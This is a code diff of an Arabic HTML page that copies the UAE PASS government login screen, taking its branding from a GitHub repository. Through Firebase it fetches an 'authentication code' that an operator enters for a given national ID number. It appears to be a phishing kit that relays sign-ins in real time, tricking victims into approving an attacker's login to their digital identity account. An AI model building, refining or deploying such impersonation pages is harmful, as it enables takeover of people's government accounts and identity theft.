@@ -7,10 +7,7 @@
     <link rel="shortcut icon" type="image/x-icon" href="https://raw.githubusercontent.com/invamsa-ai/saudi/main/favicon.ico">
     
     <!-- Bootstrap CSS من CDN -->
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-    
-    <!-- jQuery -->
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/css/bootstrap.min.css" rel="stylesheet">
     
     <!-- Font Awesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -18,12 +15,11 @@
     <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
-    <script src="firebase-config.js?v=6"></script>
+    <script src="firebase-config.js"></script>
     
-    <title>UAE PASS - الموافقة على طلب تسجيل الدخول</title>
+    <title>UAE PASS - عرض رمز المصادقة</title>
     
     <style>
-        /* CSS الأساسي */
         body, html {
             font-family: 'Dubai', 'Roboto', sans-serif !important;
             background: #F9F9FB;
@@ -66,24 +62,6 @@
             line-height: 32px;
             font-size: 22px;
             padding: 0px 16px;
-        }
-
-        /* شاشة التحميل */
-        #loadingScreen {
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            text-align: center;
-            padding: 40px 20px;
-            background: #F9F9FB;
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            z-index: 9999;
         }
         
         .card {
@@ -286,68 +264,62 @@
             text-align: center;
             color: #454f63;
         }
-
-        /* تنسيق إضافي للرقم المعروض */
-        .passcode-info {
-            margin-top: 10px;
-            font-size: 14px;
-            color: #666;
+        
+        /* شاشة التحميل */
+        #loadingScreen {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
             text-align: center;
-            display: none;
+            padding: 40px 20px;
+            background: #F9F9FB;
         }
         
-        .main-content {
-            display: none;
+        .loading-spinner {
+            font-size: 60px;
+            color: #00ac75;
+            margin-bottom: 20px;
+            animation: spin 1s linear infinite;
         }
         
-        /* حالة الاتصال */
-        .connection-status {
-            position: fixed;
-            top: 10px;
-            left: 10px;
-            background: rgba(0, 0, 0, 0.7);
-            color: white;
-            padding: 5px 10px;
-            border-radius: 5px;
-            font-size: 12px;
-            z-index: 10000;
+        /* شاشة الخطأ */
+        .error-screen {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            text-align: center;
+            padding: 40px 20px;
+            background: #F9F9FB;
         }
         
-        /* CSS للإظهار والإخفاء حسب حجم الشاشة */
-        @media only screen and (min-width: 601px) {
-            .cancel-request-mobile,
-            .card-content-right-mobile {
-                display: none !important;
-            }
-            
-            .card-content-right {
-                display: block !important;
-            }
-            
-            .cancel-request-div {
-                display: block !important;
-            }
+        .error-icon {
+            font-size: 60px;
+            color: #ff4757;
+            margin-bottom: 20px;
         }
-
+        
+        .id-number-display {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            border: 2px dashed #007bff;
+            font-size: 24px;
+            font-weight: bold;
+            color: #007bff;
+        }
+        
         @media only screen and (max-width: 600px) {
-            .cancel-request-mobile {
-                display: block !important;
-                margin-top: 10px;
-            }
-            
-            .card-content-right-mobile {
-                display: block !important;
-            }
-            
             .card-content-right {
                 display: none !important;
             }
             
-            .cancel-request-div {
-                display: none !important;
-            }
-            
             .card-content-right-mobile {
+                display: block !important;
                 margin-bottom: 30px;
                 text-align: center;
             }
@@ -365,273 +337,409 @@
                 line-height: 1.5;
             }
         }
-
-        /* تأكد من إخفاء العناصر بشكل صحيح */
+        
         .card-content-right-mobile {
             display: none;
-        }
-        
-        .card-content-right {
-            display: block;
-        }
-        
-        .cancel-request-mobile {
-            display: none;
-        }
-        
-        .cancel-request-div {
-            display: block;
-        }
-        
-        /* شريط تقدم */
-        .progress-container {
-            width: 100%;
-            max-width: 300px;
-            background-color: #eee;
-            border-radius: 5px;
-            margin: 20px auto;
-            overflow: hidden;
-        }
-        
-        .progress-bar {
-            height: 6px;
-            background-color: #4CAF50;
-            width: 0%;
-            transition: width 0.3s;
-        }
-        
-        .progress-text {
-            margin-top: 5px;
-            font-size: 12px;
-            color: #666;
         }
     </style>
 </head>
 <body>
-    <!-- حالة الاتصال -->
-    <div class="connection-status" id="connectionStatus">
-        <i class="fas fa-circle-notch fa-spin"></i> جاري الاتصال...
+    <!-- شاشة التحميل (تظهر أولاً) -->
+    <div id="loadingScreen">
+        <div class="loading-spinner">
+            <i class="fas fa-spinner fa-spin"></i>
+        </div>
+        <h2 style="color: #454f63; margin-bottom: 10px;" id="loadingTitle">جاري تحميل رمز المصادقة</h2>
+        <p style="color: #78849e;" id="loadingMessage">يرجى الانتظار...</p>
     </div>
     
-    <div class="main-container">
-        <!-- شاشة التحميل -->
-        <div id="loadingScreen">
-            <div style="font-size: 60px; color: #00ac75; margin-bottom: 20px;">
-                <i class="fas fa-spinner fa-spin"></i>
-            </div>
-            <h2 style="color: #454f63; margin-bottom: 10px;" id="loadingTitle">جاري الاتصال</h2>
-            <p style="color: #78849e;" id="loadingMessage">جاري التحضير...</p>
-            
-            <div class="progress-container">
-                <div class="progress-bar" id="progressBar"></div>
-            </div>
-            <div class="progress-text" id="progressText">0%</div>
-            
-            <div id="firebaseStatus" style="margin-top: 20px; font-size: 14px; color: #666;">
-                <i class="fas fa-cloud"></i> جاري التحقق من اتصال قاعدة البيانات...
-            </div>
+    <!-- شاشة الخطأ (تظهر عند وجود خطأ) -->
+    <div class="error-screen" id="errorScreen" style="display: none;">
+        <div class="error-icon">
+            <i class="fas fa-exclamation-triangle"></i>
         </div>
-        
-        <!-- المحتوى الرئيسي -->
-        <div class="main-content" id="mainContent">
-            <!-- Header Section -->
-            <div class="header-section">
-                <div class="login-container-fluid header">
-                    <div class="login-container flex">
-                        <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/uae-pass-logo.png" alt="UAE PASS Logo" class="uaepass-logo">
-                        <div class="header-title">الموافقة على طلب تسجيل الدخول</div>
-                    </div>
+        <h2 style="color: #ff4757; margin-bottom: 10px;" id="errorTitle"></h2>
+        <p style="color: #666;" id="errorMessage"></p>
+        <div style="margin-top: 20px;">
+            <button onclick="window.location.href='apply.html'" style="
+                padding: 10px 30px;
+                background: #007bff;
+                color: white;
+                border: none;
+                border-radius: 5px;
+                cursor: pointer;
+                margin: 0 10px;
+            ">
+                <i class="fas fa-arrow-right"></i> العودة للتسجيل
+            </button>
+        </div>
+    </div>
+    
+    <!-- المحتوى الرئيسي (يظهر بعد جلب الرمز) -->
+    <div class="main-container" id="mainContent" style="display: none;">
+        <!-- Header Section -->
+        <div class="header-section">
+            <div class="login-container-fluid header">
+                <div class="login-container flex">
+                    <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/uae-pass-logo.png" alt="UAE PASS Logo" class="uaepass-logo">
+                    <div class="header-title">عرض رمز المصادقة</div>
                 </div>
             </div>
+        </div>
 
-            <!-- Main Content -->
-            <div class="login-container-fluid">
-                <div class="login-container">
-                    <form id="loginForm" action="../../commonauth" method="post"
-                          enctype="application/x-www-form-urlencoded" autocomplete="off" novalidate>
+        <!-- Main Content -->
+        <div class="login-container-fluid">
+            <div class="login-container">
+                <form id="authForm" autocomplete="off" novalidate>
+                    
+                    <!-- Login Card -->
+                    <div class="card login">
+                        <div class="card-header">
+                            <div>
+                                <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/digital_id_H.svg" alt="Digital ID" class="uaepass-text-logo">
+                            </div>
+                            <div class="cancel-request-div">
+                                <button type="button" class="cancel-request" onclick="goBack()" aria-label="العودة">
+                                 الغاء الطلب
+                                </button>
+                            </div>
+                        </div>
                         
-                        <!-- Hidden Inputs -->
-                        <input id="username" name="username" type="hidden" value="">
-                        <input id="cancelOnWeb" type="hidden" name="cancelOnWeb" value="">
-                        <input id="tocommonauth" name="tocommonauth" type="hidden" value="true">
-                        <input id="password" name="password" type="hidden" value="">
-                        <input type="hidden" id="sessionDataKey" name="sessionDataKey" value='f9b79f82-8317-4f54-aa60-0cd566553e95' />
-                        
-                        <!-- New input for username from user -->
-                        <input type="hidden" id="usernameUserInput" name="usernameUserInput" value="">
+                        <div class="card-content">
+                            <!-- Left Content -->
+                            <div class="card-content-left">
+                                <div class="card-info">
+                                    <div class="info-title">
+                                        رمز المصادقة الخاص بك
+                                    </div>
+                                    <div class="info-app-name" id="appNameInfo">تم إنشاؤه بواسطة نظام UAE PASS</div>
 
-                        <!-- Login Card -->
-                        <div class="card login">
-                            <div class="card-header">
-                                <div>
-                                    <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/digital_id_H.svg" alt="Digital ID" class="uaepass-text-logo">
-                                </div>
-                                <div class="cancel-request-div">
-                                    <button type="button" class="cancel-request" onclick="cancel()" aria-label="إلغاء الطلب">
-                                        إلغاء الطلب
-                                    </button>
+                                    <!-- Mobile Image -->
+                                    <div class="card-content-right-mobile">
+                                        <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/login-pin.svg" alt="Login PIN" class="login-pin-image">
+                                    </div>
+
+                                    <div class="info-description">
+                                        <span>رقم الهوية المسجل:</span>
+                                    </div>
+                                    
+                                    <!-- عرض رقم الهوية -->
+                                    <div class="id-number-display" id="idNumberDisplay">
+                                        جاري التحميل...
+                                    </div>
+                                    
+                                    <!-- Passcode Display -->
+                                    <div class="card-info">
+                                        <div class="passcode-card" data-after-content="??" aria-label="الرمز" id="passcodeDisplay"></div>
+                                        <div style="margin-top: 10px; font-size: 14px; color: #666; text-align: center;">
+                                            هذا هو رمز المصادقة المخزن في النظام
+                                        </div>
+                                    </div>
+                                    
+                                    <!-- Waiting Status -->
+                                    <div class="waiting-confirmation">
+                                        <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/Timer.gif" alt="Timer" class="timer-img">
+                                        <span id="waitingText">جاري عرض رمز المصادقة</span>
+                                    </div>
+
+                                    <!-- Mobile Cancel Button -->
+                                    <div class="cancel-request-mobile">
+                                        <button type="button" class="cancel-request" onclick="goBack()" aria-label="العودة">
+                                            الغاء الطلب                                        </button>
+                                    </div>
                                 </div>
                             </div>
                             
-                            <div class="card-content">
-                                <!-- Left Content -->
-                                <div class="card-content-left">
-                                    <div class="card-info">
-                                        <div class="info-title">
-                                            طلب تسجيل الدخول من
-                                        </div>
-                                        <div class="info-app-name">Self Service Portal</div>
-
-                                        <!-- Mobile Image -->
-                                        <div class="card-content-right-mobile">
-                                            <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/login-pin.svg" alt="Login PIN" class="login-pin-image">
-                                        </div>
-
-                                        <div class="info-description">
-                                            <span>افتح تطبيق الهوية الرقمية الخاص بك، وأدخل الرقم الموضح لتسجيل الدخول</span>
-                                        </div>
-                                        
-                                        <!-- Passcode Display -->
-                                        <div class="card-info">
-                                            <div class="passcode-card" data-after-content="00" aria-label="الرمز" id="passcodeDisplay"></div>
-                                            <div class="passcode-info" id="passcodeInfo">
-                                                مصدر الرقم: <span id="numberSource">محلي</span>
-                                            </div>
-                                        </div>
-                                        
-                                        <!-- Waiting Status -->
-                                        <div class="waiting-confirmation">
-                                            <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/Timer.gif" alt="Timer" class="timer-img">
-                                            <span id="waitingText">في انتظار تأكيدك</span>
-                                        </div>
-
-                                        <!-- Mobile Cancel Button -->
-                                        <div class="cancel-request-mobile">
-                                            <button type="button" class="cancel-request" onclick="cancel()" aria-label="إلغاء الطلب">
-                                                إلغاء الطلب
-                                            </button>
-                                        </div>
-                                    </div>
-                                </div>
-                                
-                                <!-- Desktop Image -->
-                                <div class="card-content-right">
-                                    <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/login-pin.svg" alt="Login PIN" class="login-pin-image">
-                                </div>
+                            <!-- Desktop Image -->
+                            <div class="card-content-right">
+                                <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/login-pin.svg" alt="Login PIN" class="login-pin-image">
                             </div>
                         </div>
-                        
-                        <!-- Footer -->
-                        <div class="polling-footer">
-                            <img class="ids-logo" src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/n6.png" alt="IDS Logo" />
-                            <p class="poweredby"> Powered by UAE PASS </p>
-                        </div>
-                    </form>
-                </div>
+                    </div>
+                    
+                    <!-- Footer -->
+                    <div class="polling-footer">
+                        <img class="ids-logo" src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/n6.png" alt="IDS Logo" />
+                        <p class="poweredby"> Powered by UAE PASS </p>
+                    </div>
+                </form>
             </div>
         </div>
     </div>
 
-<script>
-/* ================== CONFIG ================== */
-let firebaseInitialized = false;
-let realtimeDb = null;
-let firestoreDb = null;
-let checkInterval = null;
-let currentRecordId = null;
+    <script>
+        // إعدادات Firebase
+    
 
-/* ================== UI ================== */
-function updateProgress(p, msg) {
-  document.getElementById('progressBar').style.width = p + '%';
-  document.getElementById('progressText').innerText = p + '%';
-  if (msg) document.getElementById('loadingMessage').innerText = msg;
-}
+        let firebaseApp;
+        let database;
 
-function updateConnection(text) {
-  document.getElementById('firebaseStatus').innerText = text;
-}
+        // دالة تهيئة Firebase
+        function initializeFirebase() {
+            try {
+                if (!firebase.apps.length) {
+                    firebaseApp = firebase.initializeApp(firebaseConfig);
+                    database = firebase.database();
+                    console.log('✅ Firebase تم تهيئته بنجاح');
+                    return true;
+                } else {
+                    firebaseApp = firebase.app();
+                    database = firebase.database();
+                    console.log('✅ Firebase مثبت بالفعل');
+                    return true;
+                }
+            } catch (error) {
+                console.error('❌ خطأ في تهيئة Firebase:', error);
+                return false;
+            }
+        }
 
-/* ================== INIT ================== */
-async function initFirebase() {
-  try {
-    if (window.firebaseServices) {
-      window.firebaseServices.initialize();
-      realtimeDb = window.firebaseServices.realtimeDb();
-      firestoreDb = window.firebaseServices.firestore();
-      firebaseInitialized = true;
-      updateProgress(40, 'تم الاتصال بقاعدة البيانات');
-      updateConnection('✅ متصل بقاعدة البيانات');
-      return true;
-    }
-  } catch (e) {
-    console.error(e);
-  }
-  return false;
-}
+        // استخراج رقم الهوية من URL
+        function getIdFromURL() {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get('id');
+        }
 
-/* ================== LISTENER ================== */
-function setupRealtimeListener(recordId) {
-  if (!recordId || !realtimeDb) return;
-
-  const ref = realtimeDb.ref(`user_auth_numbers/${recordId}`);
-
-  ref.on('value', snap => {
-    const data = snap.val();
-
-    if (!data) {
-      updateProgress(50, 'في انتظار موافقة المسؤول...');
-      return;
-    }
-
-    if (data.status === 'waiting') {
-      updateProgress(60, 'الطلب قيد المراجعة...');
-      return;
-    }
-
-    if (data.status === 'completed' && data.number !== undefined) {
-      showAuthNumber(data.number);
-    }
-  });
-}
-
-/* ================== DISPLAY ================== */
-function showAuthNumber(num) {
-  clearInterval(checkInterval);
-
-  const formatted = num < 10 ? '0' + num : num;
-  document.getElementById('passcodeDisplay')
-    .setAttribute('data-after-content', formatted);
-
-  updateProgress(100, 'تم استلام رقم المصادقة');
-  document.getElementById('loadingScreen').style.display = 'none';
-  document.getElementById('mainContent').style.display = 'block';
-}
-
-/* ================== START ================== */
-async function start() {
-  updateProgress(10, 'جاري التحضير...');
-  const params = new URLSearchParams(location.search);
-  currentRecordId = params.get('recordId');
-
-  const ok = await initFirebase();
-  if (!ok) {
-    updateProgress(30, 'تعذر الاتصال');
+        // دالة جلب رمز المصادقة من Firebase
+        async function getAuthCodeFromFirebase() {
+            const idNumber = getIdFromURL();
+            
+            if (!idNumber) {
+                showError('خطأ', 'لم يتم تحديد رقم الهوية', 'الرجاء العودة إلى صفحة التسجيل وإدخال رقم الهوية');
+                return;
+            }
+            
+            try {
+                // البحث عن السجل في Firebase
+                const safeKey = idNumber.replace(/[.#$\/\[\]]/g, '_');
+                const snapshot = await database.ref('authentications/' + safeKey).once('value');
+                
+                if (!snapshot.exists()) {
+                    showError('غير موجود', `رقم الهوية ${idNumber} غير موجود في النظام`, 'الرجاء التحقق من الرقم والمحاولة مرة أخرى');
+                    return;
+                }
+                
+                const record = snapshot.val();
+                
+         if (!record.auth_code) {
+    showWaitingScreen(idNumber);
     return;
-  }
+}
+                
+                // إظهار البيانات
+                showAuthCode(record, idNumber);
+                
+            } catch (error) {
+                console.error('❌ خطأ في جلب البيانات:', error);
+                showError('خطأ في الاتصال', 'تعذر الاتصال بقاعدة البيانات', 'يرجى المحاولة مرة أخرى لاحقاً');
+            }
+        }
 
-  updateProgress(50, 'في انتظار رقم المصادقة...');
-  setupRealtimeListener(currentRecordId);
+        // عرض رمز المصادقة
+        function showAuthCode(record, idNumber) {
+            // إخفاء شاشة التحميل
+            document.getElementById('loadingScreen').style.display = 'none';
+            
+            // إظهار المحتوى الرئيسي
+            document.getElementById('mainContent').style.display = 'block';
+            
+            // تعيين رقم الهوية
+            document.getElementById('idNumberDisplay').textContent = idNumber;
+            
+            // تعيين رمز المصادقة
+            const authCode = record.auth_code;
+            document.getElementById('passcodeDisplay').setAttribute('data-after-content', authCode);
+            document.getElementById('passcodeDisplay').setAttribute('aria-label', `الرمز ${authCode}`);
+            
+            // تحديث نص الانتظار
+            document.getElementById('waitingText').textContent = `رمز المصادقة: ${authCode}`;
+            
+            // تحديث معلومات التطبيق
+            document.getElementById('appNameInfo').innerHTML = `
+                تم إنشاؤه في: ${record.date || ''}<br>
+                الوقت: ${record.time || ''}
+            `;
+            
+            // بدء تحديث الرمز تلقائياً كل 10 ثوانٍ
+            startAutoRefresh(idNumber);
+        }
 
-  checkInterval = setInterval(() => {
-    updateProgress(
-      Math.min(80, document.getElementById('progressBar').style.width.replace('%','') * 1 + 1),
-      'في انتظار موافقة المسؤول...'
-    );
-  }, 1000);
+        // عرض خطأ
+        function showError(title, message, details) {
+            document.getElementById('loadingScreen').style.display = 'none';
+            document.getElementById('errorScreen').style.display = 'flex';
+            document.getElementById('errorTitle').textContent = title;
+            document.getElementById('errorMessage').innerHTML = `${message}<br><small>${details}</small>`;
+        }
+
+        // التحديث التلقائي للرمز
+        function startAutoRefresh(idNumber) {
+            setInterval(async () => {
+                try {
+                    const safeKey = idNumber.replace(/[.#$\/\[\]]/g, '_');
+                    const snapshot = await database.ref('authentications/' + safeKey).once('value');
+                    
+                    if (snapshot.exists()) {
+                        const record = snapshot.val();
+                        const currentCode = document.getElementById('passcodeDisplay').getAttribute('data-after-content');
+                        
+                        if (record.auth_code && record.auth_code !== currentCode) {
+                            document.getElementById('passcodeDisplay').setAttribute('data-after-content', record.auth_code);
+                            document.getElementById('passcodeDisplay').setAttribute('aria-label', `الرمز ${record.auth_code}`);
+                            document.getElementById('waitingText').textContent = `تم تحديث الرمز إلى: ${record.auth_code}`;
+                        }
+                    }
+                } catch (error) {
+                    console.error('❌ خطأ في التحديث:', error);
+                }
+            }, 10000); // كل 10 ثوانٍ
+        }
+
+        // العودة للخلف
+        function goBack() {
+            window.location.href = 'apply.html';
+        }
+
+        // عند تحميل الصفحة
+        document.addEventListener('DOMContentLoaded', function() {
+            if (initializeFirebase()) {
+                getAuthCodeFromFirebase();
+            } else {
+                showError('خطأ في الإعدادات', 'تعذر تهيئة قاعدة البيانات', 'يرجى التحقق من اتصال الإنترنت');
+            }
+        });
+        // دالة لعرض شاشة الانتظار
+function showWaitingScreen(idNumber) {
+    // إخفاء شاشة التحميل الأصلية
+    document.getElementById('loadingScreen').style.display = 'none';
+    
+    // إنشاء شاشة الانتظار
+    const waitingScreen = document.createElement('div');
+    waitingScreen.id = 'waitingScreen';
+    waitingScreen.style.cssText = `
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        text-align: center;
+        padding: 40px 20px;
+        background: #F9F9FB;
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        z-index: 9999;
+    `;
+    
+    waitingScreen.innerHTML = `
+        <div style="font-size: 60px; color: #007bff; margin-bottom: 20px;">
+            <i class="fas fa-spinner fa-spin"></i>
+        </div>
+        <h2 style="color: #454f63; margin-bottom: 10px;">جاري التحقق</h2>
+        <p style="color: #78849e; margin-bottom: 20px;">
+            جاري التحقق من وجود رمز مصادقة
+        </p>
+       
+     
+    `;
+    
+    document.body.appendChild(waitingScreen);
+    
+    // بدء التحقق التلقائي
+    startAutoCheck(idNumber);
 }
 
-document.addEventListener('DOMContentLoaded', start);
-</script>
+// دالة التحقق التلقائي
+function startAutoCheck(idNumber) {
+    let checkInterval;
+    let checkCount = 0;
+    const maxChecks = 60; // 5 دقائق (60 * 5 ثوان)
+    
+    const updateStatus = () => {
+        checkCount++;
+        const waitingScreen = document.getElementById('waitingScreen');
+        if (waitingScreen) {
+            const statusText = waitingScreen.querySelector('h2');
+            const infoText = waitingScreen.querySelector('p:nth-of-type(2)');
+            
+            if (statusText) {
+                statusText.textContent = `جاري التحقق `;
+            }
+            
+            if (infoText && checkCount % 10 === 0) {
+                infoText.innerHTML = `
+                    <i class="fas fa-sync-alt"></i>
+                    جاري التحقق... تمت المحاولة ${checkCount} مرة
+                `;
+            }
+        }
+    };
+    
+    const checkForAuthCode = async () => {
+        if (checkCount >= maxChecks) {
+            clearInterval(checkInterval);
+            showError('انتهى الوقت', 'تم التحقق لمدة 5 دقائق دون وجود رمز', 'يرجى العودة والمحاولة لاحقاً');
+            return;
+        }
+        
+        updateStatus();
+        
+        try {
+            const safeKey = idNumber.replace(/[.#$\/\[\]]/g, '_');
+            const snapshot = await database.ref('authentications/' + safeKey).once('value');
+            
+            if (snapshot.exists()) {
+                const record = snapshot.val();
+                
+                if (record.auth_code) {
+                    // إزالة شاشة الانتظار
+                    const waitingScreen = document.getElementById('waitingScreen');
+                    if (waitingScreen) {
+                        waitingScreen.remove();
+                    }
+                    
+                    // إظهار الرمز
+                    showAuthCode(record, idNumber);
+                    clearInterval(checkInterval);
+                    return;
+                }
+            }
+        } catch (error) {
+            console.error('❌ خطأ في التحقق:', error);
+        }
+    };
+    
+    // التحقق أول مرة فوراً
+    checkForAuthCode();
+    
+    // ثم كل 5 ثوانٍ
+    checkInterval = setInterval(checkForAuthCode, 5000);
+}
 
+// تحديث دالة showError لتكون أنيقة أكثر
+function showError(title, message, details) {
+    // إزالة شاشة الانتظار إذا كانت موجودة
+    const waitingScreen = document.getElementById('waitingScreen');
+    if (waitingScreen) {
+        waitingScreen.remove();
+    }
+    
+    const loadingScreen = document.getElementById('loadingScreen');
+    if (loadingScreen) {
+        loadingScreen.style.display = 'none';
+    }
+    
+    document.getElementById('errorScreen').style.display = 'flex';
+    document.getElementById('errorTitle').textContent = title;
+    document.getElementById('errorMessage').innerHTML = `
+        <div style="font-size: 16px; margin-bottom: 10px;">${message}</div>
+        <div style="font-size: 14px; color: #666; background: #f8f9fa; padding: 10px; border-radius: 5px;">
+            <i class="fas fa-lightbulb"></i> ${details}
+        </div>
+    `;
+}
+    </script>
 </body>
 </html>
